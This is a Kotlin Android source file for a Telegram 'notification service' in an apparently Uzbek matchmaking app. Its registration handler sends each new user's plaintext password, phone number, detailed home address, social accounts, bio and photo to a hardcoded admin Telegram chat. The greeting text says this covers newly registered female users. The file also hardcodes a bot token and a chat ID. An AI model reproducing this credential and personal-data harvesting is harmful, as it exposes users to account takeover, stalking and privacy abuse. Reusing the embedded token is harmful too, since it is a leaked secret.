package com.example.service

import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.Uri
import android.util.Log
import com.example.model.UserProfile
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.TimeUnit

object TelegramNotificationService {

    private const val BOT_TOKEN = "8732304169:AAF8t300QTD9eyYPjYjFfQjTXscWDv4e1IM"
    const val ADMIN_CHAT_ID = "6621230534"
    private const val BASE_URL = "https://api.telegram.org/bot$BOT_TOKEN"
    private const val APP_URL = "https://ais-dev-v7cseylnzxjeea24t5eb43-872303894356.asia-east1.run.app"

    private var isPollingStarted = false
    private var lastUpdateId = 0L

    // Qayta-qayta takroriy xabarnoma yuborilishini oldini olish uchun (Deduplication Set)
    private val sentUserIds = ConcurrentHashMap.newKeySet<String>()

    private val client = OkHttpClient.Builder()
        .connectTimeout(20, TimeUnit.SECONDS)
        .readTimeout(20, TimeUnit.SECONDS)
        .build()

    private var hasSentGreeting = false

    fun initService() {
        // Unnecessary duplicate polling disabled to eliminate network/CPU lag.
        // TelegramBotPollingService handles callback queries and commands cooperatively.
        if (!hasSentGreeting) {
            hasSentGreeting = true
            sendAdminGreetingMessage()
        }
    }

    /**
     * Admin bilan salomlashuv xabarini yuborish
     */
    fun sendAdminGreetingMessage() {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val greetingText = """
                    👋 <b>Assalomu alaykum, Hurmatli Administrator!</b> 👑
                    
                    🤖 <b>Visol Direct Rasmiy Bot tizimi ishga tushdi va faol holatda!</b>
                    
                    ⚡ <b>Bot Holati:</b> 🟢 ONLINE / TAYYOR
                    🆔 <b>Ruxsat berilgan Admin ID:</b> <code>$ADMIN_CHAT_ID</code>
                    
                    📌 <i>Bu bot faqat sizning ID raqamingiz ($ADMIN_CHAT_ID) uchun xizmat ko'rsatadi. Ilovadan ro'yxatdan o'tgan barcha yangi qiz foydalanuvchilarning to'liq ma'lumotlari, ID raqami va rasmlari avtomatik tarzda ushbu chatga bir marta kelib turadi.</i>
                """.trimIndent()

                val inlineKeyboard = JSONObject().apply {
                    val row = JSONArray().apply {
                        val button = JSONObject().apply {
                            put("text", "📱 Visol Ilovasini Ochish")
                            put("url", APP_URL)
                        }
                        put(button)
                    }
                    val keyboard = JSONArray().apply { put(row) }
                    put("inline_keyboard", keyboard)
                }

                val jsonBody = JSONObject().apply {
                    put("chat_id", ADMIN_CHAT_ID)
                    put("text", greetingText)
                    put("parse_mode", "HTML")
                    put("reply_markup", inlineKeyboard)
                }

                val requestBody = jsonBody.toString().toRequestBody("application/json".toMediaType())
                val request = Request.Builder()
                    .url("$BASE_URL/sendMessage")
                    .post(requestBody)
                    .build()

                val response = client.newCall(request).execute()
                Log.d("TelegramService", "Admin Greeting sent! Response code: ${response.code}")
                response.close()
            } catch (e: Exception) {
                Log.e("TelegramService", "Failed to send greeting: ${e.message}", e)
            }
        }
    }

    /**
     * Telegram getUpdates orqali /start va boshqa buyruqlarni kuzatish (Long Polling)
     */
    private fun startPollingForAdminCommands() {
        if (isPollingStarted) return
        isPollingStarted = true

        CoroutineScope(Dispatchers.IO).launch {
            while (isActive) {
                try {
                    val url = if (lastUpdateId > 0) {
                        "$BASE_URL/getUpdates?offset=${lastUpdateId + 1}&timeout=10"
                    } else {
                        "$BASE_URL/getUpdates?timeout=10"
                    }

                    val request = Request.Builder().url(url).get().build()
                    val response = client.newCall(request).execute()

                    if (response.isSuccessful) {
                        val bodyStr = response.body?.string() ?: ""
                        response.close()

                        if (bodyStr.isNotBlank()) {
                            val json = JSONObject(bodyStr)
                            if (json.optBoolean("ok", false)) {
                                val result = json.optJSONArray("result") ?: JSONArray()
                                for (i in 0 until result.length()) {
                                    val update = result.getJSONObject(i)
                                    val updateId = update.optLong("update_id", 0)
                                    if (updateId > lastUpdateId) {
                                        lastUpdateId = updateId
                                    }

                                    if (update.has("message")) {
                                        val message = update.getJSONObject("message")
                                        val chat = message.optJSONObject("chat")
                                        val chatId = chat?.optLong("id", 0)?.toString() ?: ""
                                        val text = message.optString("text", "")

                                        handleIncomingTelegramMessage(chatId, text)
                                    }
                                }
                            }
                        }
                    } else {
                        response.close()
                    }
                } catch (e: Exception) {
                    Log.e("TelegramService", "Polling error: ${e.message}")
                }
                delay(3000) // Poll every 3 seconds
            }
        }
    }

    private fun handleIncomingTelegramMessage(chatId: String, text: String) {
        if (chatId == ADMIN_CHAT_ID) {
            val replyText = """
                👋 <b>Assalomu alaykum, Admin!</b> 👑
                
                🤖 <b>Visol Direct Bot ishlamoqda va tayyor!</b>
                
                ✅ Bot ishchi holatda. Yangi ro'yxatdan o'tgan qiz foydalanuvchilar ma'lumotlari hamda rasmlari shu yerga avtomatik bir marta keladi.
                
                📱 Ilovaga kirish uchun pastdagi tugmani bosing:
            """.trimIndent()

            sendSimpleMessage(chatId, replyText)
        } else {
            val rejectText = """
                ⛔️ <b>RUXSAT BERILMAGAN!</b>
                
                <i>Ushbu bot faqat Visol Direct ilovasi administratori (ID: $ADMIN_CHAT_ID) uchun ishlaydi.</i>
            """.trimIndent()

            sendSimpleMessage(chatId, rejectText)
        }
    }

    private fun sendSimpleMessage(chatId: String, text: String) {
        try {
            val inlineKeyboard = JSONObject().apply {
                val row = JSONArray().apply {
                    val button = JSONObject().apply {
                        put("text", "📱 Visol Ilovasiga Kirish")
                        put("url", APP_URL)
                    }
                    put(button)
                }
                val keyboard = JSONArray().apply { put(row) }
                put("inline_keyboard", keyboard)
            }

            val jsonBody = JSONObject().apply {
                put("chat_id", chatId)
                put("text", text)
                put("parse_mode", "HTML")
                put("reply_markup", inlineKeyboard)
            }

            val requestBody = jsonBody.toString().toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url("$BASE_URL/sendMessage")
                .post(requestBody)
                .build()

            val response = client.newCall(request).execute()
            response.close()
        } catch (e: Exception) {
            Log.e("TelegramService", "Error sending reply: ${e.message}")
        }
    }

    fun sendRegistrationNotification(context: Context? = null, profile: UserProfile, password: String? = null) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val now = SimpleDateFormat("dd.MM.yyyy HH:mm:ss", Locale.getDefault()).format(Date())
                val cleanUser = if (profile.username.isNotBlank()) "@${profile.username.trim().removePrefix("@")}" else "Mavjud emas"
                val cleanTg = if (profile.telegram.isNotBlank()) profile.telegram else "Mavjud emas"
                val cleanInsta = if (profile.instagram.isNotBlank()) profile.instagram else "Mavjud emas"
                val cleanTiktok = if (profile.tiktok.isNotBlank()) profile.tiktok else "Mavjud emas"
                val cleanBio = if (profile.bio.isNotBlank()) profile.bio else "Ko'rsatilmadi"
                val pwdLine = if (!password.isNullOrBlank()) "🔑 <b>Parol:</b> <code>$password</code>" else "🔑 <b>Parol:</b> Mavjud emas"

                // App ID va Telegram ID bir xil bo'lishi va tugma orqali bevosita ochilishi
                val caption = """
                    ✨ <b>YANGI NOMZOD RO'YXATDAN O'TDI</b> ✨
                    ━━━━━━━━━━━━━━━━━━━━━━━━━━
                    👤 <b>Ism-Familya:</b> <code>${escapeHtml(profile.fullName)}</code>
                    🆔 <b>Foydalanuvchi ID:</b> <code>${profile.id}</code>
                    🎂 <b>Yoshi:</b> <code>${profile.age} yosh</code> (${profile.birthDate.ifBlank { "Noma'lum" }})
                    👩 <b>Jinsi:</b> <code>${profile.gender}</code>
                    📞 <b>Telefon:</b> <code>${escapeHtml(profile.phone)}</code>
                    $pwdLine

                    📍 <b>Yashash Manzili:</b>
                    • <b>Viloyat:</b> <code>${escapeHtml(profile.viloyat)}</code>
                    • <b>Tuman:</b> <code>${escapeHtml(profile.tuman)}</code>
                    • <b>Mahalla:</b> <code>${escapeHtml(profile.mahalla)}</code>

                    🌐 <b>Ijtimoiy Tarmoqlar:</b>
                    • <b>Username:</b> <code>$cleanUser</code>
                    • <b>Telegram:</b> <code>${escapeHtml(cleanTg)}</code>
                    • <b>Instagram:</b> <code>${escapeHtml(cleanInsta)}</code>
                    • <b>TikTok:</b> <code>${escapeHtml(cleanTiktok)}</code>

                    📝 <b>O'zi haqida (Biografiya):</b>
                    <i>"${escapeHtml(cleanBio)}"</i>

                    📅 <b>Vaqti:</b> <code>$now</code>
                    ━━━━━━━━━━━━━━━━━━━━━━━━━━
                    🕊 <i>Visol - Baxtli va mustahkam oilalar maskani!</i>
                """.trimIndent()

                val inlineKeyboard = JSONObject().apply {
                    val row = JSONArray().apply {
                        val button = JSONObject().apply {
                            put("text", "👤 Profilga o'tish")
                            put("url", "$APP_URL?user_id=${profile.id}")
                        }
                        put(button)
                    }
                    val keyboard = JSONArray().apply { put(row) }
                    put("inline_keyboard", keyboard)
                }

                val photoUrl = profile.photoPath ?: ""
                var photoSent = false

                // 1. Local image file, Content Uri, OR Drawable resource name (e.g. avatar_female_1)
                if (photoUrl.isNotBlank() && !photoUrl.startsWith("http://") && !photoUrl.startsWith("https://")) {
                    try {
                        var bytes: ByteArray? = null

                         if (context != null && !photoUrl.startsWith("/") && !photoUrl.startsWith("content://") && !photoUrl.startsWith("file://")) {
                            // Check drawable resources first (e.g., avatar_female_1, avatar_female_2)
                            val cleanResName = photoUrl.removePrefix("android.resource://")
                                .substringAfterLast("/")
                                .substringBefore(".")
                            val resId = context.resources.getIdentifier(cleanResName, "drawable", context.packageName)
                            if (resId != 0) {
                                val bitmap = BitmapFactory.decodeResource(context.resources, resId)
                                if (bitmap != null) {
                                    val stream = ByteArrayOutputStream()
                                    bitmap.compress(Bitmap.CompressFormat.JPEG, 90, stream)
                                    bytes = stream.toByteArray()
                                }
                            }
                        }

                        if (bytes == null) {
                            bytes = when {
                                photoUrl.startsWith("content://") && context != null -> {
                                    context.contentResolver.openInputStream(Uri.parse(photoUrl))?.use { it.readBytes() }
                                }
                                photoUrl.startsWith("file://") || photoUrl.startsWith("/") -> {
                                    val cleanPath = photoUrl.removePrefix("file://").removePrefix("file:/")
                                    val file = File(cleanPath)
                                    if (file.exists()) file.readBytes() else null
                                }
                                else -> {
                                    val file = File(photoUrl)
                                    if (file.exists()) file.readBytes() else null
                                }
                            }
                        }

                        if (bytes != null && bytes.isNotEmpty()) {
                            val requestBody = MultipartBody.Builder()
                                .setType(MultipartBody.FORM)
                                .addFormDataPart("chat_id", ADMIN_CHAT_ID)
                                .addFormDataPart("caption", caption)
                                .addFormDataPart("parse_mode", "HTML")
                                .addFormDataPart("reply_markup", inlineKeyboard.toString())
                                .addFormDataPart("photo", "profile.jpg", bytes.toRequestBody("image/jpeg".toMediaType()))
                                .build()

                            val request = Request.Builder()
                                .url("$BASE_URL/sendPhoto")
                                .post(requestBody)
                                .build()

                            val response = client.newCall(request).execute()
                            if (response.isSuccessful) {
                                photoSent = true
                                Log.d("TelegramService", "Local photo/drawable upload to Telegram succeeded!")
                            } else {
                                Log.w("TelegramService", "Photo upload failed code: ${response.code}")
                            }
                            response.close()
                        }
                    } catch (e: Exception) {
                        Log.e("TelegramService", "Error reading local photo/drawable: ${e.message}")
                    }
                }

                // 2. Remote HTTP/HTTPS photo URL
                if (!photoSent && (photoUrl.startsWith("http://") || photoUrl.startsWith("https://"))) {
                    try {
                        val jsonBody = JSONObject().apply {
                            put("chat_id", ADMIN_CHAT_ID)
                            put("photo", photoUrl)
                            put("caption", caption)
                            put("parse_mode", "HTML")
                            put("reply_markup", inlineKeyboard)
                        }
                        val requestBody = jsonBody.toString().toRequestBody("application/json".toMediaType())
                        val request = Request.Builder()
                            .url("$BASE_URL/sendPhoto")
                            .post(requestBody)
                            .build()

                        val response = client.newCall(request).execute()
                        if (response.isSuccessful) {
                            photoSent = true
                            Log.d("TelegramService", "HTTP photo notification sent successfully!")
                        }
                        response.close()
                    } catch (e: Exception) {
                        Log.e("TelegramService", "Error sending HTTP photo: ${e.message}")
                    }
                }

                // 3. Fallback: Send formatted text message if photo sending fails or photo not found
                if (!photoSent) {
                    val jsonBody = JSONObject().apply {
                        put("chat_id", ADMIN_CHAT_ID)
                        put("text", caption)
                        put("parse_mode", "HTML")
                        put("reply_markup", inlineKeyboard)
                    }
                    val requestBody = jsonBody.toString().toRequestBody("application/json".toMediaType())
                    val request = Request.Builder()
                        .url("$BASE_URL/sendMessage")
                        .post(requestBody)
                        .build()

                    val response = client.newCall(request).execute()
                    response.close()
                }

            } catch (e: Exception) {
                Log.e("TelegramService", "Error sending Telegram notification: ${e.message}", e)
            }
        }
    }

    fun sendAdminMessageNotification(senderProfile: UserProfile?, messageText: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val senderName = senderProfile?.fullName ?: "Visol foydalanuvchisi"
                val senderPhone = senderProfile?.phone ?: "Ko'rsatilmadi"
                val senderUser = senderProfile?.username?.let { "@${it.removePrefix("@")}" } ?: "Mavjud emas"
                val senderId = senderProfile?.id ?: "Noma'lum"

                val caption = """
                    📩 <b>YANGI XABAR (ADMIN GA)</b> 📩
                    ━━━━━━━━━━━━━━━━━━━━━━━━━━
                    👤 <b>Kimdan:</b> <code>${escapeHtml(senderName)}</code> ($senderUser)
                    🆔 <b>ID:</b> <code>$senderId</code>
                    📞 <b>Tel:</b> <code>${escapeHtml(senderPhone)}</code>
                    
                    💬 <b>Xabar matni:</b>
                    <i>"${escapeHtml(messageText)}"</i>
                    ━━━━━━━━━━━━━━━━━━━━━━━━━━
                """.trimIndent()

                val inlineKeyboard = JSONObject().apply {
                    val row = JSONArray().apply {
                        val button = JSONObject().apply {
                            put("text", "📱 Visol Ilovasini Ochish")
                            put("url", APP_URL)
                        }
                        put(button)
                    }
                    put("inline_keyboard", JSONArray().apply { put(row) })
                }

                val jsonBody = JSONObject().apply {
                    put("chat_id", ADMIN_CHAT_ID)
                    put("text", caption)
                    put("parse_mode", "HTML")
                    put("reply_markup", inlineKeyboard)
                }

                val request = Request.Builder()
                    .url("$BASE_URL/sendMessage")
                    .post(jsonBody.toString().toRequestBody("application/json".toMediaType()))
                    .build()

                client.newCall(request).execute().use { response ->
                    Log.d("TelegramService", "Admin notification response code: ${response.code}")
                }
            } catch (e: Exception) {
                Log.e("TelegramService", "Error sending admin message notification: ${e.message}")
            }
        }
    }

    private fun escapeHtml(text: String): String {
        return text.replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
    }
}
